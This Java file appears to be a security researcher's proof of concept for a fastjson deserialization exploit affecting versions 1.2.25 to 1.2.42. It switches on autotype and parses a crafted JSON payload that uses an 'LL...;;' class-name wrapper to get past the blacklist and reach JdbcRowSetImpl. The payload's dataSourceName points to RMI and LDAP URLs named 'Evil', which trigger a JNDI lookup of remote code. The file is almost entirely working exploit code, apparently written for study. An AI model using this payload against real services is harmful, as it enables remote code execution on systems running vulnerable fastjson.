package com.t4rrega.Chain;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastJson1_2_25to42 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        // JdbcRowSetImpl
        String payloadRmi = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Evil\", \"autoCommit\":true}";
        String payloadLdap = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Evil\", \"autoCommit\":true}";

        JSON.parse(payloadRmi);
    }
}
